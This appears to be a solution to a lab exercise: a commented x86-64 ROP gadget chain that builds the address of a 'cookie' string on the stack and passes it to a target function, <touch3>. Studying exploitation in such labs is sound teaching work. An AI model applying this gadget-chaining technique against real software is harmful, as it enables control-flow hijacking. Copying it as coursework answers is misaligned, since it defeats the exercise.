  movq %rsp,%rax            ################################################
  ret                       # The first part consists of two gadgets
  movq %rax,%rdi            # which pass the stack top value to %rdi
  ret                       ################################################
  popq %rax                 #
  ret                       #
  movl %eax,%edx            # The second part pop a preset constant value
  ret                       # and pass from %eax to %esi
  movl %edx,%ecx            #
  ret                       #
  movl %ecx,%esi            #
  ret                       ################################################
  lea (%rdi,%rsi,1),%rax    # The third part sums up the stack value %rdi
  ret                       # and a constant %rsi, whose result should be
  movq %rax,%rdi            # the address of our cookie string in ascii.
  ret                       # Finally set the sum value to rdi and goto <touch3>
                            ################################################

